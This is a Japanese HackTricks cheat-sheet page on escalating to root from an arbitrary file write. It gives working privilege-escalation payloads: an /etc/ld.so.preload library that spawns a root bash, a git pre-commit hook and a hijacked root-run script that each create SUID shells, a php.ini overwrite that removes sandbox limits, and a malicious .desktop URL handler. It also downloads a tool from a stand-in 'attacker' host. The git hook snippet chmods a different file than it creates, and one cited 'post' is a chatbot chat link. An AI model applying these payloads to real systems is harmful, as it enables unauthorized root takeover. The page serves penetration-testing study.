# rootへの任意ファイル書き込み

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

このファイルは **`LD_PRELOAD`** 環境変数と同様に振る舞いますが、**SUIDバイナリ** に対しても有効です。\
もしこのファイルを作成または変更できるなら、各実行バイナリと共にロードされるライブラリへの**パスを追加するだけで済みます**。

例えば: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) は、git リポジトリ内でコミット作成やマージなどのさまざまなイベントで実行されるスクリプトです。したがって、特権を持つスクリプトやユーザーがこれらの操作を頻繁に行い、`.git` フォルダに書き込みできる場合、これを利用して privesc することが可能です。

例えば、git リポジトリの `.git/hooks` にスクリプトを作成しておけば、新しい commit が作成されるたびに常に実行されるようにできます：
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron & Time files

TODO

### Service & Socket files

TODO

### 特権付きの PHP サンドボックスが使用する制限された `php.ini` を上書きする

一部のカスタムデーモンは、ユーザー提供の PHP を `php` を使って **制限された `php.ini`**（例: `disable_functions=exec,system,...`）で検証します。サンドボックス内のコードが `file_put_contents` のような **何らかの書き込みプリミティブ** を持ち、かつデーモンが使用している **正確な `php.ini` のパス** に到達できる場合、その設定を **上書きして** 制限を解除し、権限昇格した状態で動作する2回目のペイロードを送信できます。

典型的な流れ:

1. 1回目のペイロードでサンドボックスの設定を上書きする。
2. 危険な関数が再び有効になった状態で、2回目のペイロードがコードを実行する。

最小の例（デーモンが使用するパスに置き換えてください）:
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
If the daemon runs as root (or validates with root-owned paths), the second execution yields a root context. This is essentially **privilege escalation via config overwrite** when the sandboxed runtime can still write files.

### binfmt_misc

`/proc/sys/fs/binfmt_misc` にあるファイルは、どのバイナリがどのタイプのファイルを実行するかを示します。TODO: check the requirements to abuse this to execute a rev shell when a common file type is open.

### Overwrite schema handlers (like http: or https:)

被害者の設定ディレクトリに書き込み権限がある攻撃者は、システムの挙動を変えるファイルを簡単に置換または作成でき、結果として意図しないコード実行を引き起こします。`$HOME/.config/mimeapps.list` を編集して HTTP および HTTPS の URL ハンドラを悪意あるファイルに向ける（例: `x-scheme-handler/http=evil.desktop` を設定）ことで、攻撃者は **任意の http や https リンクをクリックした際にその `evil.desktop` ファイルに指定されたコードが実行される** ようにできます。例えば、`evil.desktop` に以下の悪意あるコードを `$HOME/.local/share/applications` に置くと、外部URLをクリックするたびに埋め込まれたコマンドが実行されます:
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
詳細は [**this post**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49) を参照してください。実際の脆弱性を悪用するために使用された事例です。

### Root がユーザー書き込み可能な scripts/binaries を実行している場合

権限の高いワークフローが `/bin/sh /home/username/.../script` （または非特権ユーザーが所有するディレクトリ内の任意のバイナリ）のようなものを実行している場合、ハイジャックできます:

- **Detect the execution:** [pspy](https://github.com/DominicBreuker/pspy) でプロセスを監視して root がユーザー制御のパスを呼び出すのを捕捉します:
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Confirm writeability:** 対象のファイルとそのディレクトリが自分のユーザによって所有され、書き込み可能であることを確認する。
- **Hijack the target:** 元の binary/script をバックアップし、SUID shell（またはその他の root action）を作成する payload を配置してから、権限を復元する：
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **特権のアクションをトリガーする**（例: UI ボタンを押して helper を起動する）。root が乗っ取られたパスを再実行すると、`./rootshell -p` で昇格したシェルを取得する。

## 参考

- [HTB Bamboo – hijacking a root-executed script in a user-writable PaperCut directory](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)

{{#include ../../banners/hacktricks-training.md}}
